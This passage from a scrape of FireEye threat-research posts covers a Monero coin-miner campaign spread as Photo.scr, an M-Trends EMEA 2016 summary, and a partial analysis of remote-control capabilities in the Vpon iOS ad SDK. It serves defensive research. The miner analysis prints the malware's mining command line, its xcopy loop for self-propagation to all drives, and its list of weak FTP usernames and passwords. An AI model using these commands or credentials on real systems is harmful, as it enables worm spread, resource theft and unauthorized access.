 <p>Upon installation, the following DNS request is made:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Tab12.png"" /></p>
 <h5>Encoded instructions for mining</h5>
 <p>The malware makes a GET request to http://hrtests[.]ru/test.html?0;
  this is the same domain against which a DNS request was first
  performed. In response to the GET request, the malware expects the
  following encoded data, as shown in Figure 3. The binary also contains
  a list of domains (given in the appendix, registered in 2016), from
  where it fetches the mining pool information.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Encoded response</span></p>
 <p>We analyzed the encoded data and found that it is employing a simple
  decoding algorithm (ROT47 on custom characterset). Pseudocode is shown here:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Tab13.png"" /></p>
 <p>A decoded response is depicted in Figure 4.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Fig4.jpeg"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: The decoded response containing coin
    mining hashes</span></p>
 <p>The decoded text contains the mining parameters and credentials for mining.</p>
 <h5>Dropped Binary</h5>
 <p>The mining malware  – NsCpuCNMiner32.exe – is typically run from
  within a user temp directory. When executed in a standalone Windows
  virtual machine (VM), it detects the virtual environment and exits
  with a dialog box that “the application can’t run under virtual
  machine”. However, when we execute it through FireEye multi-vector
  virtual execution engine (MVX), it successfully executes and allowed
  us to analyze the malware behavior.</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""554""> <tbody>
    <tr>
      <td valign=""top"" width=""554""><p>C:\Documents and
          Settings\admin\Local Settings\Temp\NsCpuCNMiner32.exe<br />  
          MD5:  <b>3afeb8e9af02a33ff71bf2f6751cae3a</b>
          <br />   SHA1: fd358cfe41c7aa3aa9e4cf62f832d8ae6baa8107</p>
      </td> </tr></tbody></table>
 <p>It is a general-purpose miner that has been used for mining
  cryptocurrencies in the past and is invoked by several families of
  malware using several parameters. These settings define which mining
  pool it will use.</p>
 <p>NsCpuCNMiner32.exe is invoked by Photo.scr using the ShellExecuteA
  method with the following parameters:<br /> </p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""554""> <tbody>
    <tr>
      <td valign=""top"" width=""554""><p>API Name:  ShellExecuteA  
          Address:  0x00402404<br /> Params:  [0x0, open, cmd, /c start
          /b %TEMP%\NsCpuCNMiner32.exe -dbg -1 -o s<br />   
          tratum+tcp://mine.moneropool.com:3333 -t 1 -u 4<br />   
          4puJ9e27jyKc1et48J7SZLQ4pDcos96c6u84vcwHgCCce1T<br />   
          YqXxzpyR3gY793D9mKGEY7WjtC6TKA7eDbtvfrgGHoDNBGx<br />     -p
          x, NULL, 0]</p> </td> </tr></tbody></table>
 <p>Note that these parameters are the same as those which are decoded
  from the response from hrtests[.]ru (above). Photo.scr obtains the
  settings regarding mining pool from hrtests[.]ru and passes them as
  input to the miner, which uses this information to start mining activity.</p>
 <p>The miner also checks for a <i>Process Debug Port</i> to detect
  execution within a virtual machine or for the presence of a debugger.
  It was successfully evading VMware and Qemu based virtualized
  sandboxes, and terminated after execution in those virtualization
  environments. If it executes successfully, it initiates mining
  activity by contacting the mining pool defined in the parameters
  passed from photo.scr.<br /> </p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""554""> <tbody>
    <tr>
      <td valign=""top"" width=""554""><p>  Protocol  Type:  udp   Qtype: 
          Host Address   Hostname:  mine.moneropool.com<br />  
          Imagepath:  c:\Documents and Settings\admin\Local
        Settings\Temp\NsCpuCNMiner32.exe</p> </td> </tr></tbody></table>
 <h5>Coin Mining traffic</h5>
 <p>The following network traffic is generated by the miner executable
  while mining activity is being performed, as shown in Figure 5.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Coin mining traffic</span></p>
 <h5>Mining pools contacted</h5>
 <p>The mining process contacts the mining pools, i.e.
    <i>mine.moneropool.com:3333, monero.crypto-pool.fr:3333,
    pool.minexmr.com:5555, xmr.prohash.net:7777.</i></p>
 <h5>Propagation</h5>
 <p>The malware propagates from a victim system by copying photo.scr to
  the root of all lettered drives connected to the victim machine. This
  way, the malware propagates through both removable and network drives
  mounted to a victim system. The malware invokes a native command-line
  copying utility, “xcopy”, to propagate itself:</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""554""> <tbody>
    <tr>
      <td valign=""top"" width=""554""><p>for %%i in (A B C D E F G H J K L
          M N O P R S T Q U Y I X V X W Z) do xcopy /y &quot;%s&quot;
        %%i:\</p> </td> </tr></tbody></table>
 <h5>FTP Traffic Analysis</h5>
 <p>Once the malware has been successfully copied to all the drives
  connected to the system, it calls out to various public FTP servers
  including servers belonging to Government, Industry, Education and SME
  organizations. The binary was observed attempting to connect to almost
  54,000 IPs via FTP; however, only 203 IPs were running active FTP
  services. The malware attempted to authenticate using six different
  usernames and 17 different passwords. The username and password
  combinations attempted suggest that the attacker is attempting to
  leverage weak or default credentials for authentication.</p>
 <p>A geolocation map of the 203 active IPs is shown in Figure 6. (The
  list of IPs is removed for privacy, please note that geolocation
  metadata may not be reliable in all cases).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: Geolocation of active FTP servers to
    which the binary attempts to connect</span></p>
 <p>The binary attempted the following username and password combinations:</p>
 <p>
  <b>Usernames</b>: <i>anonymous, www-data, administrator, ftp, user, user123</i></p>
 <p>
  <b>Passwords</b>: <i>password, pass1234, 123456, 1234567, 12345678,
    123456789, 1234567890, qwerty, 000000, 111111, 123123, abc123,
    admin123, derok010101, windows, 123qwe, 000000</i></p>
 <p>The malware successfully authenticated to  three of the 203 FTP
  servers. In all three cases, the malware attempted to upload the file
  “Photo.scr” from the local machine to the remote server. In two cases
  the file upload wasn't allowed, leading to a “Permission denied”
  error. The file transfer was successful in one case, as seen in Figure
  7. The malware was observed attempting to FTP a copy of itself to a HP
  printer with an Internet-routable IP address, but used the STOR
  command instead of the commonly used PUT command.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: Successful FTP transfer for Photo.scr</span></p>
 <h5>Pervasiveness of Photo.scr</h5>
 <p>We attempted to locate files named “Photo.scr” available on the
  Internet using open sources. We identified both HTTP and FTP servers
  residing in eight countries, indicating that the malware has been
  present in many countries worldwide. A geolocation map of these
  domains is shown in Figure 8.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8: Geolocation map of the public Web and
    FTP servers containing the Photo.scr sample</span></p>
 <h4>URL Fuzzing on Domain List</h4>
 <p>Since there are no links on the site main page, we resolved to fuzz
  commonly used names of HTML pages and directories in an attempt to
  generate responses from the malicious web server. We found several
  malicious active pages such as Photos.html and Photo.html serving the
  same malicious content. As an example, browsing to the Photos.html
  page results in the malware being loaded into the browser as text/html
  and triggering the download via the iFRAME. However, there were other
  pages on this site that were serving different, rather benign looking
  content. Details of other pages found via fuzzing are mentioned in
  Appendix B.</p>
 <h4>Conclusion</h4>
 <p>Cryptocurrencies have been gaining popularity in recent years,
  particularly since Bitcoin emerged in 2009 as the first decentralized
  cryptocurrency. The decentralized nature of the internet and the
  widespread availability of vulnerable hosts has motivated
  cybercriminals to covertly target connected machines and abuse them to
  harvest cryptocurrencies.</p>
 <p>Recently we observed a coin-mining campaign invovling around 60
  unique domains being launched in April 2016, all pointing to a single
  IP host. Using social engineering techniques, users were tricked to
  browse to these domains, where they were presented with an HTML page
  containing an iframe that forced the browser to download a file named
  Photo.scr. This file was carefully named to entice curious users to
  click on it, thus executing the malware binary, infecting the user’s
  computer and enslaving its resources to mine BitMonero coins. </p>
 <p>For persistence, the malware implemented a common Registry autorun
  mechanism, attempted to infect removable and network drives, and
  attempted to propagate to globally distributed FTP servers using weak
  or default credentials. This hack-for-profit campaign is another
  example of how the underground economy flourishes with the innovation
  and ingenuity of cybercriminals. Analyzing this campaign provided
  insights into the threat this campaign poses to online users globally.</p>
 <p>FireEye’s multi-flow detection mechanism identifies this malware at
  every level, from the point of entry to the callback. Additionally,
  the malware was unable to detect or bypass the FireEye sandbox.</p>
 <h4>Credits and Acknowledgements</h4>
 <p>We would like to thank and acknowledge Dan Caselden, Devon Kerr,
  Imad Khurram and Ali Hussain for their contribution.</p>
 <h4>Appendix A</h4>
 <h5>Domain/URLs in the malware executable</h5>
 <p>An in-depth analysis into the binary revealed the following domains
  (available as plain text strings) hosting the pool information for the miner.</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""554""> <tbody>
    <tr>
      <td valign=""top"" width=""554""><p>Stafftest.ru (First seen in 2014,
          resolving to IP: 88.214.200.145 back then )</p> <p>Hrtests.ru
          (First seen in 2013, resolving to IP: 88.214.200.145 )</p>
          <p>Profetest.ru (First seen in 2016, resolving to IP:
          5.196.241.192 )</p> <p>Testpsy.ru (First seen in 2015,
          resolving to IP: 178.32.238.223 )</p> <p>Pstests.ru (First
          seen in 2016, resolving to IP: 151.80.9.92 )</p> <p>Qptest.ru
          (First seen in 2015, resolving to IP: 88.214.200.145 )</p>
          <p>Prtests.ru  (First seen in 2016, resolving to IP:
          178.33.188.146 )</p> <p>Jobtests.ru  (First seen in 2016,
          resolving to IP: 178.33.188.146 )</p> <p>Iqtesti.ru  (First
          seen in 2016, resolving to IP: No DNS answer)</p> </td> </tr></tbody></table>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9: Map showing the location of the
    servers where these domains are hosted</span></p>
 <h4>Appendix B</h4>
 <p>Figure 10 shows browsing to Photo.html.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Fig10.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10: Browsing view of page Photo.html</span></p>
 <p>Translating the title to Chinese results in this: “Magic Dragon
  spider pool ---- purchase please contact: dragon magic spider pool”.
  While the content on the page results in this: “Long sentences dynamic
  magic _”</p>
 <p>All the links on the page point to:
  http://www.ggkuu[.]top/%3C%E9%BE%99%E9%AD%94_%E5%8A%A8%E6%80%81%E5%8F%A5%E5%AD%90%3E.
  Clicking on any of these links, results in redirection to a page
  serving the malware.</p>
 <p>Looking for other HTML pages on this domain, we resorted to crawling
  and fuzzing and found more than 1,200 HTML pages. A few of them are
  illustrated in the following table. The majority of these pages seem
  to be serving the same malware binary as the main page.</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""554""> <tbody>
    <tr>
      <td valign=""top"" width=""139""><p>/awk.html</p> <p>/l.html</p>
        <p>/printer.html</p> <p>/pdfs.html</p> <p>/names.html</p>
        <p>/author.html</p> </td> <td valign=""top"" width=""139""><p>/ls.html</p> <p>/tf.html</p>
        <p>/mirrors.html</p> <p>/private.html</p>
        <p>/viewonline.html</p> <p>/firewall.html</p> </td> <td valign=""top"" width=""139""><p>/bv.html</p> <p>/backups.html</p>
        <p>/premier.html</p> <p>/ppts.html</p> <p>/cf.html</p> <p> </p>
      </td> <td valign=""top"" width=""139""><p>/compose.html</p>
        <p>/kernel.html</p> <p>/cgi.html</p> <p>/disclaimer.html</p>
        <p>/blogs.html</p> </td> </tr></tbody></table>
 <p>The Sitemap page of this domain was particularly interesting, as it
  seems to be pointing to various news articles on ybnews[.]cn and
  96hq[.]com. Each time we browse to this page, new content is
  generated. Figure 10 and Figure 11 show manifesting links to
  ybnews[.]cn and 96hq[.]com.</p>
 <p>
  <span class=""type-XS"">
    <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Fig11.png"" /></span></p>
 <p>
  <span class=""type-XS"">Figure 11: Sitemap containing URLs of ybnews[.]cn</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Evil%20Miner/Fig12.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 12: Sitemap containing URLs from 96hq[.]com</span></p>
 <p>Fuzzing and crawling for directories, we found more than 1,200
  directory folders, which mostly point to pages that are serving
  malware. A few of these folders are illustrated as follows:
  ‘/desktop/’, ‘/category/’, ‘/nz/’,’/8/’, ‘/fr/’, ‘/d/’, ‘/cz/’,
  ‘/fk/’, ‘/dk/’, ‘/cu/’, ‘/gr/’, ‘/cc/’, ‘/o/’, ‘/be/’, ‘/ar/’, ‘/bj/’.</p>",http://www.fireeye.com/blog/threat-research/2016/06/resurrection-of-the-evil-miner.html
EMEA Organizations Must Rise to the Challenge of Stopping Advanced Threats,"<p>Since 2010, Mandiant, a FireEye company, has presented trends,
  statistics and case studies of cyber attacks involving advanced threat
  actors. As part of its many global investigations in 2015, Mandiant
  responded to several breaches in Europe, Middle East and Africa
  (EMEA). Throughout the year we collected statistics on the
  investigations specific to the region and analysed the trends.</p>
 <p>To share what we have been seeing throughout this past year, we
  present “M-Trends – EMEA Edition 2016.” This report marks the start of
  an annual M-Trends edition focused on EMEA. The report aims to empower
  organisations and the security community, arm them with the knowledge
  relating to the unique challenges facing the region, and assist in
  improving security posture to combat advanced attacks.</p>
 <p>Some of the key findings include:</p>
 <ul> <li>
    <b>Organizations in EMEA took three times longer to detect a
    compromise: </b>The mean dwell time (time between compromise and
    detection) in the region was 469 days, versus a global average of
    146 days.</li> <li>
    <b style=""font-size: 12.0px; line-height: 1.538;"">EMEA organizations
      cannot rely on local agencies to notify them of
    compromises: </b>Of all observed compromises in EMEA, 12% of
    notifications came from an external source. Globally, external
    sources accounted for 53% of notifications. EMEA organizations
    discovered breaches internally 88% of the time, but EMEA average
    dwell time (469 days) suggests this often came too late</li> <li>
    <b style=""font-size: 12.0px; line-height: 1.538;"">Many organisations
      in EMEA were re-compromised within months of an initial breach: </b>
    <span style=""font-size: 12.0px; line-height: 1.538;"">Unsuitable
      techniques to hunt for attacks within an environment often
      resulted in a failure to understand the true scope of the
      incident. Mandiant consultants found many EMEA organizations still
      opting for a traditional forensic methodology, only analysing a
      handful of machines, and subsequently increasing the risk of
      becoming re-compromised. </span></li> </ul>
 <p>The findings show that organisations in the EMEA region have a lot
  of room to improve their incident detection and response capabilities. </p>
 <p>Download <a href=""https://www2.fireeye.com/WEB-RPT-M-Trends-2016-EMEA.html"">M-Trends
    EMEA Edition 2016</a> for further insight.</p>
 <p>Register for our <a href=""https://www.brighttalk.com/webcast/10703/210483?utm_source=blog"">webinar</a>
  to discuss the findings with the authors of this report and to learn
  more about improving an organisation’s security posture.</p>",http://www.fireeye.com/blog/threat-research/2016/06/emea_organizationsm.html
Pwned by Vpon,"<p>
  <a href=""http://www.vpon.com/"">Vpon</a> is one of many mobile ad SDKs
  marketed towards mainland Chinese and Taiwanese developers and app
  users. Recently, FireEye mobile security researchers identified a
  branch of Vpon ad SDK on iOS containing code that allows a malicious
  actor (be it the app developer or the SDK creator) to <b>remotely</b>
  command the app to perform the following actions:</p>
 <ul> <li>Stealthily record audio</li> <li>Capture screenshots and
  videos</li> <li>Monitor and upload device location</li>
    <li>Read/delete/create/modify files within the app sandbox</li>
    <li>Exfiltrate data to remote servers</li> <li>Load URL schemes to
    identify and launch apps installed on the device</li> <li>Access and
    modify the address book</li> </ul>
 <p>In our investigation, we found that not all SDKs provided by Vpon
  enable the above capabilities – only the SDKs that are integrated with
  another ad platform aggregator, <a href=""https://github.com/jcccn/AdsMoGo-iOS-SDK"">AdsMogo</a>. AdsMogo
  not only functions as a standalone ad serving platform, but also
  provides the unification of a dynamic list of third party ad SDKs such
  as Inmobi, Youmi, Millenial Meida, Tapjoy, Vungle, etc. The
  implementation allows the participating ad SDKs to integrate behaviors
  that are not advertised in their standalone offerings.</p>
 <h4>Malicious Impact</h4>
 <p>We found a total of <b>36</b> apps that have the risky version of
  Vpon SDK integrated with AdsMogo platform. These apps are still
  available in the App Store as of May 25, 2016. According to <a href=""http://vpon-sdk.github.io/ios/changelog/"">Vpon’s changelog</a>
  for iOS, the latest version at the time of posting is <i>4.5.1</i>.</p>
 <p>The delivery of the abovementioned malicious capabilities is through
    <a href=""https://cordova.apache.org/"">Apache Cordova</a> (formerly
  known as PhoneGap) plugins. Cordova is an open source, community
  contributed framework that supports hybrid app development. With
  Cordova, a developer can program an app in pure JavaScript and other
  web technologies while having it be executed in multiple native
  environments such as iOS and Android. The plugin implementations allow
  a developer to invoke OS functionality (e.g. Camera, Media, Contacts)
  through JavaScript code.</p>
 <p>However, throughout the changelog, there is no mention of the use of
  Cordova plugins. Our investigation indicates that Cordova plugins have
  been used starting with version <i>4.2</i>, when a major build took
  place. This has persisted through all subsequent releases.</p>
 <h4>Technical Machinery</h4>
 <h5>Apache Cordova for Remote Command and Control</h5>
 <p>Vpon SDK leverages the popular open source cross-platform mobile app
  development framework <a href=""https://cordova.apache.org/docs/en/latest/guide/overview/index.html"">Apache
  Cordova</a> for remotely controlling the app behavior through
  JavaScript. In the community’s own words:</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""338"">Apache Cordova is an open-source
        mobile development framework. It allows you to use standard web
        technologies - HTML5, CSS3, and JavaScript for cross-platform
        development. Applications execute within wrappers targeted to
        each platform, and rely on standards-compliant API bindings to
        access each device's capabilities such as sensors, data, network
        status, etc.</td> </tr></tbody></table>
 <p>Due to the underlying bridging implementation of Cordova, there are
  numerous limitations that constrain a hybrid app from being as capable
  as its full-fledged native counterpart when it comes to interacting
  with the native OS and device hardware. To fill in the gap and to
  expand the app’s capability to access native functionalities, the
  Cordova community provides a series of <a href=""https://cordova.apache.org/docs/en/latest/guide/platforms/ios/plugin.html"">plugins</a>.
  For instance, the <i>cordova-plugin-camera</i> allows a JavaScript
  call to access the camera on the device and to perform system
  functions. Furthermore, on iOS, one can implement their own custom
  plugin. Figure 1 is a diagram of the architecture of a typical Cordova
  based mobile app.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Vpon%20Jing/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. A high-level view of the Cordova
    application architecture<br />  Source: Apache Cordova under <a href=""http://www.apache.org/licenses/LICENSE-2.0"">Apache License</a></span></p>
 <p>Vpon implemented its own plugin that encapsulates all the existing
  open source plugins. This is not exposed to the developer in its
  standalone releases of the SDK, therefore, developers could not hook
  the functionality into their apps. However, AdsMogo provides a
  software adapter that allows Vpon SDK provider to conceal the plugin
  initialization and ad rendering. When an app developer integrates Vpon
  through AdsMogo provided interface, all the plugin capabilities are
  enabled within the app.</p>
 <h4>Objective-C Side of Story</h4>
 <h5>Power of Cordova Plugin</h5>
 <p>The pivotal piece that bridges the communication within a hybrid app
  between its web contents and the native OS environment is an
  implementation of the <i>HTML Rendering Engine</i>, which is <a href=""https://developer.apple.com/library/ios/documentation/UIKit/Reference/UIWebView_Class/"">UIWebView</a>
  in iOS. However, the OS determines that a large set of device and
  platform functionalities should not be available to web based
  applications through the single interface <i>[UIWebView
  stringByEvaluatingJavaScriptFromString]</i>. Plugins, therefore, serve
  as a workaround of the constraint.</p>
 <p>According to the <a href=""https://cordova.apache.org/docs/en/latest/guide/hybrid/plugins/index.html"">development
  guidelines</a>, a plugin is a package of injected code that allows the
  Cordova webview within which the app renders to communicate with the
  native platform on which it runs. Plugins consist of a single
  JavaScript interface along with corresponding native code libraries
  for each supported platform. In essence, this hides the various native
  code implementations behind a common JavaScript interface.</p>
 <h5>Cornerstone of a Vpon Cordova Plugin</h5>
 <p>An iOS plugin is implemented as an Objective-C class that extends
  the <b>
    <i>CDVPlugin</i></b> class. For Vpon SDK, this Objective-C class is <b>
    <i>VponCDVPlugin</i></b>, which is further extended by the plugin
  implementation shown in Figure 2.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Vpon%20Jing/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. A list of plugin implementations in
    Vpon’s Cordova Plugin</span></p>
 <p>Further examination shows that all the above plugin implementations
  are simply wrappers of the corresponding existing open source plugins
  in the Apache repository. Therefore, they export the same interfaces
  for JavaScript calls as those of the open source plugins.</p>
 <h5>The Inheritance Relationship of View Controllers</h5>
 <p>Cordova applications are ordinarily implemented as a browser-based
  <i>WebView</i> within the native mobile platform. However, as a third
  party ad library, one has little control over whether it is embedded
  in a hybrid app or a pure native one. Therefore, it is imperative to
  roll out a customized web view implementation within the ad library.
  According to the <a href=""https://cordova.apache.org/docs/en/latest/guide/platforms/ios/webview.html"">official
  documentation</a>, the underpinning element is the <b>
    <i>CDVViewController</i></b> from the Cordova library, which serves
  as the point of contact for the tailored communication between
  JavaScript and the native OS.</p>
 <p>For the Vpon SDK, the embodiment of this view controller class is <b>
    <i>VponCDVViewController</i></b>. Special setup and configuration
  was performed when an instance is instantiated. Figure 3 shows a
  subset of methods it has, as well as a look into one of its functions
    <i>[VponCDVViewController webView:shouldStartLoadWithRequest:navigationType:]</i>.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Vpon%20Jing/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Vpon Cordova plugin’s implementation
    of entry point view controller CDVViewController</span></p>
 <p>
  <i>VponCDVViewController</i> is never directly instantiated and added
  to the host app’s view controller hierarchy, but rather is dependent
  on the instantiation of many of its child implementations,
  <i>VponPhoneGapViewController</i>. Figure 4 shows the parent and child
  relationship of these two view controllers.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Vpon%20Jing/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. <i>VponCDVViewController</i> is the
    parent of <i>VponPhoneGapViewController</i></span></p>
 <p>Furthermore, <i>VponPhoneGapViewController</i> is the parent of the
  following view controllers, as shown in Figure 5.</p>
 <ul> <li>VponVideoWebViewController</li>
  <li>VpadnNativeADViewController</li>
  <li>VponInAppWebViewController</li>
  <li>VpadnNativeAdActionViewController</li>
  <li>VponAdViewController</li> <li>VponInterstatialViewController</li> </ul>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Vpon%20Jing/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5. <i>VponPhoneGapViewController</i> is
    the parent of the list of UIViewController implementations</span></p>
 <p>To better illustrate the workflow of Vpon Cordova plugin, let’s
  focus on one of the <i>UIViewController</i> implementations. A
  <i>VponAdViewController</i> instance is created and set into operation
  in a series of method invocations started when the Vpon SDK is
  activated through <i>AdsMoGoAdapterVpon</i>, an adapter implementation
  of the Adapter interface provided by AdsMoGo platform. The sequence of
  invocations is depicted in Figure 6.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Vpon%20Jing/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6. Sequence of invocations that
    illustrates the integration of Vpon and AdsMoGo</span></p>
 <p>Figure 7 displays the content of <i style=""font-size: 12.0px; line-height: 1.538;"">[VpadnBanner sendRequestGetAd]</i>
  <span style=""font-size: 12.0px; line-height: 1.538;""> with the
    highlighted area showing the initialization of the child view
    controller implementation of </span>
  <i style=""font-size: 12.0px; line-height: 1.538;"">VponCDVViewController</i>
  <span style=""font-size: 12.0px; line-height: 1.538;"">.</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Vpon%20Jing/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7. The implementation of <i>[VpadnBanner
    sendRequestGetAd]</i> with the instantiation of <i>VponCDVViewController</i></span></p>
 <p>When <i>VponAdViewController </i>is used to open a video Ad through
    <i>[VponAdViewController openVideoAd:]</i>, it effectively creates
  an instance of the <i>VponVideoWebViewController</i> and renders the
  remotely retrieved video content.</p>
 <h3>Malicious Capabilities</h3>
 <p>The capabilities that are beyond the realm of ad serving in Vpon are
  manifested by the plugin implementations. Each capability is supported
  by an implementation of an open source Cordova plugin. Figure 8 shows
  the full set of commands supported by <b>vpadn-sdk-i-v4.2.16</b>: the
  latest as of March 28, 2016, which is the required plugin mapping for
  a custom Cordova plugin.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Vpon%20Jing/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8. Vpon Cordova Plugin Mapping</span></p>
 <p>For those who are interested in knowing more about Cordova Plugin
  development, please refer to <a href=""https://cordova.apache.org/docs/en/dev/guide/hybrid/plugins/"">Apache’s
    plugin development guide</a>.</p>
 <p>Figure 9 gives a look into the implementation of one of the plugins,
  <i>VponCDVCapture</i>. It is a plugin that supports stealth recording
  in response to the corresponding command from JavaScript. The
  implementation within Vpon SDK is merely a wrapping of the open source
  plugin <a href=""https://cordova.apache.org/docs/en/latest/reference/cordova-plugin-media-capture/index.html"">cordova-plugin-media-capture</a>
  with a different class name that is consistent with Vpon’s naming convention.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Vpon%20Jing/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9. Vpon’s implementation of the media
    capture plugin</span></p>
 <p>According to Cordova’s documentation on the media capture plugin
  shown in Figure 10, the utilization should always be accompanied by a
  UI control that allows the user to accept or deny. While the OS
  prompts the user for granting the access to the microphone the first
  time it is going to be used by the app, it is not sufficient in
  raising the user’s suspicion if the host app provides functionalities
  that require legitimate access to the microphone.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Vpon%20Jing/Fig10.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10. Apache documentation on the
    media-capture plugin</span></p>
 <p>In addition to accessing microphone, Vpon Cordova plugin also
  provides interface to JavaScript for using the device camera and the
  address book. Figure 11 and Figure 12 provide a glimpse into the
  relevant code.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Vpon%20Jing/Fig11.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 11. Vpon’s cordova plugin supports
    JavaScript access to the device camera</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Vpon%20Jing/Fig12.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 12.  Vpon’s cordova plugin supports
    JavaScript access to the device address book</span></p>
 <h4>JavaScript Side of Story</h4>
 <p>JavaScript code is the linchpin for the framework that enables
  plugins to function as intended. As <a href=""https://cordova.apache.org/docs/en/3.0.0/guide/hybrid/plugins/#javascript"">Apache
  Cordova</a> has put it:</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""432""> <tbody>
    <tr>
      <td valign=""top"" width=""432""><p>The entry point for any plugin is
          JavaScript. The reason developers use Cordova is so they can
          use and write JavaScript, not Objective-C, not Java, not C#.
          The JavaScript interface for your plugin is the front-facing
          and arguably most important part of your Cordova plugin.</p>
          <p>You can structure your plugin's JavaScript however you
        like.</p> </td> </tr></tbody></table>
 <p>There are two ways to serve JavaScript content to a Cordova enabled
  app. First, the app is compiled and packaged with local JavaScript
  files and the HTML pages that consume them. Second, the app retrieves
  remote JavaScript at runtime through web technologies. They are not
  mutually exclusive; rather, they are supplemental to each other for
  robust and flexible cross-platform apps.</p>
 <p>In the case of Vpon SDK, there is no local JavaScript content
  involved in the app’s lifecycle. Instead, it is delivered to the
  rendering view controllers during an ad request to the Vpon ad server.
  Figure 13 shows the hardcoded URL of loaded JavaScript for each and
  every ad request.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Vpon%20Jing/Fig13.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 13. The hardcoded URL of loaded
    JavaScript for each and every ad request</span></p>
 <p>The current content of the above JavaScript file on the server is
  shown in Listing 1. This piece further directs the rendering view to
  load JavaScript for an iOS device, which is a customized version of
  the Apache <i>cordova.js</i> file, the base of the Cordova JavaScript
  API. Listing 2 shows an excerpt of the current content of this
  JavaScript file, with highlights on the invocation of Vpon Cordova
  plugin <b>VponSdk</b>.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Vpon%20Jing/List1.png"" /></p>
 <p>
  <span class=""type-XS"">Listing 1. Content of file http://m.vpadn.com/sdk/vpadn-sdk-a-core-v1.js </span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Vpon%20Jing/List2.png"" /></p>
 <p>
  <span class=""type-XS"">Listing 2. Content excerpt of JavaScript file
    vpadn-sdk-i-core-v1.js served by the Vpon server</span></p>
 <p>Through our investigation and traffic monitoring within a limited
  time period, we did not observe active network communications that
  deliver malicious JavaScript from the remote server. However, this
  does not justify that it cannot be taken advantage of to behave
  maliciously. It is rather easy to replace the plugin name, the
  invocation method, and the relevant parameters specified to execute
  the functionalities of other plugins. For instance, to activate the
  microphone to record surroundings, one only needs to add the following
  JavaScript code (Listing 3) in the remote JS file.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Vpon%20Jing/List3.png"" /></p>
 <p>
  <span class=""type-XS"">Listing 3. PoC exploit</span></p>
 <p>This is the functional equivalent to the following execution in <a href=""http://www.cycript.org/"">cycript</a> within a running app
  embedded with the malicious Vpon SDK, as shown in Figure 14.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Vpon%20Jing/Fig14.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 14. Activate device microphone for voice
